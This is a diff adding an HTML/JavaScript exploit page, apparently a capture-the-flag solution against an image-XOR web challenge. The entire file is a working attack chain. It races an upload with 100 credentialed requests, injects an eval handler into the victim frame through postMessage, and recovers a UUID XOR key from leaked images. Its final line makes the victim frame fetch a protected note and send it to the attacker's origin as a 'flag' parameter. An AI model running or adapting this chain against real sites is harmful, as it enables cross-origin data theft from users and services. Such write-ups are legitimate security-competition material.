@@ -1,0 +1,193 @@
+<iframe name="1"></iframe>
+<iframe name="2"></iframe>
+<script src="https://cdn.jsdelivr.net/npm/jshashes@1.0.8/hashes.min.js"></script>
+<script>
+  function getKeyFromXoredImages(originalImage, xoredImage) {
+    function removeRepeatedSubstring(inputString) {
+      const length = inputString.length;
+
+      for (let i = 1; i <= length / 2; i++) {
+        if (length % i === 0) {
+          const substring = inputString.substring(0, i);
+          const repeatedSubstring = substring.repeat(length / i);
+
+          if (repeatedSubstring === inputString) {
+            return substring;
+          }
+        }
+      }
+
+      return inputString; // No repeated substring found
+    }
+    const canvas = document.createElement("canvas");
+    canvas.width = originalImage.width;
+    canvas.height = originalImage.height;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(originalImage, 0, 0);
+
+    const canvas2 = document.createElement("canvas");
+    canvas2.width = xoredImage.width;
+    canvas2.height = xoredImage.height;
+    const ctx2 = canvas2.getContext("2d");
+    ctx2.drawImage(xoredImage, 0, 0);
+    const xoredImageData = ctx2.getImageData(
+      0,
+      0,
+      canvas2.width,
+      canvas2.height
+    ).data;
+
+    const xorLen = 4; // Assuming 4 channels (RGBA)
+    const xorKey = [];
+
+    const originalImageData = ctx.getImageData(
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    ).data;
+
+    for (let i = 0; i < originalImageData.length; i += xorLen) {
+      const xorValue = originalImageData[i] ^ xoredImageData[i];
+      xorKey.push(String.fromCharCode(xorValue));
+    }
+
+    return removeRepeatedSubstring(xorKey.join(""));
+  }
+
+  const getMessage = () => {
+    return new Promise((resolve, reject) => {
+      onmessage = (e) => {
+        resolve(e.data);
+      };
+    });
+  };
+  function generateRandomFilename(inputFilename) {
+    const ext = inputFilename.split(".").pop();
+
+    const hasher = new Hashes.MD5();
+    const hash = hasher.hex(inputFilename);
+
+    const randomFilename = `${hash}.${ext}`;
+
+    return randomFilename;
+  }
+  async function readImage(buffer) {
+    return new Promise((resolve) => {
+      const blob = new Blob([buffer], { type: "image/jpeg" });
+      const img = new Image();
+      img.src = URL.createObjectURL(blob);
+      console.log(URL.createObjectURL(blob));
+      document.body.appendChild(img);
+      img.onload = () => resolve(img);
+    });
+  }
+
+  function findMostRepeatedString(inputString, len) {
+    const stringCounts = {};
+    let maxCount = 0;
+    let mostRepeatedString = null;
+
+    for (let i = 0; i < inputString.length; i++) {
+      if (!(i % len == 0)) continue;
+      const substr = inputString.substring(i, i + len);
+      if (!substr) break;
+
+      if (stringCounts[substr]) {
+        stringCounts[substr]++;
+      } else {
+        stringCounts[substr] = 1;
+      }
+
+      if (stringCounts[substr] > maxCount) {
+        maxCount = stringCounts[substr];
+        mostRepeatedString = substr;
+      }
+    }
+
+    return mostRepeatedString;
+  }
+  function fileToBase64(file, callback) {
+    const reader = new FileReader();
+    reader.readAsDataURL(file);
+    reader.onload = function () {
+      callback(reader.result.split(",")[1]);
+    };
+    reader.onerror = function (error) {
+      console.error("Error reading file:", error);
+    };
+  }
+  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+  const TARGET = "https://proxy:8080";
+  const htmlfilename = "exploit.html";
+  const f1 = document.querySelector("iframe[name='1']");
+  const f2 = document.querySelector("iframe[name='2']");
+  f2.src = TARGET + "/image";
+
+  // get payload html.jpg
+  fetch("./html.jpg").then(async (htmlJPG) => {
+    const htmlbuffer = await htmlJPG.arrayBuffer();
+
+    const filehtml = new File([new Uint8Array(htmlbuffer)], htmlfilename);
+    let data;
+    fileToBase64(filehtml, (image) => {
+      data = new URLSearchParams({
+        image: image,
+        xorString: "x.html",
+      });
+      // trigger race condition in upload
+      (async () => {
+        for (var i = 0; i < 100; i++) {
+          fetch(TARGET + "/api/image/xor?" + data, {
+            credentials: "include",
+            method: "GET",
+            mode: "no-cors",
+          });
+        }
+      })();
+    });
+
+    await sleep(1000);
+    // open race condition file, the file will be generated from md5 of "x" appended with .html extension
+    f1.src = TARGET + "/uploads/" + generateRandomFilename("x.html");
+    console.log("img src: ", f1.src);
+
+    await sleep(1000);
+
+    // add onmessage eval on f2, frame of imagexor app
+    function addOnMessage() {
+      function OnMessage() {
+        onmessage = (e) => eval(e.data);
+      }
+      // f2 frame
+      top[1].window.eval(`(${OnMessage})()`);
+    }
+    // add onmessage from f1 to f2, to bypass
+    f1.contentWindow.postMessage(`(${addOnMessage})()`, "*");
+
+    await sleep(500);
+
+    function sendXoredImage() {
+      const imgBlob = document.querySelector("img[src^='blob']");
+      console.log(imgBlob.src)
+      fetch(imgBlob.src).then(async (res) => {
+        top.postMessage(await res.arrayBuffer(), "*");
+      });
+    }
+
+    var xoredImgBuffer = getMessage();
+    // send xored image from challenge domain to our domain
+    f2.contentWindow.postMessage(`(${sendXoredImage})()`, "*");
+    xoredImgBuffer = await xoredImgBuffer;
+    // do read image
+    const xoredImg = await readImage(xoredImgBuffer);
+    const origImageBuffer = await fetch("./original.jpg").then(
+      async (res) => await res.arrayBuffer()
+    );
+    const origImage = await readImage(origImageBuffer);
+    // get xor key from the image with length 36 (length of an uuid)
+    const key = findMostRepeatedString(getKeyFromXoredImages(origImage, xoredImg), 36);
+    f2.contentWindow.postMessage(`fetch('/api/note/get?password=${key}').then(async(res)=>fetch('${location.origin}?flag='+await res.text()))`, '*')
+  });
+</script>
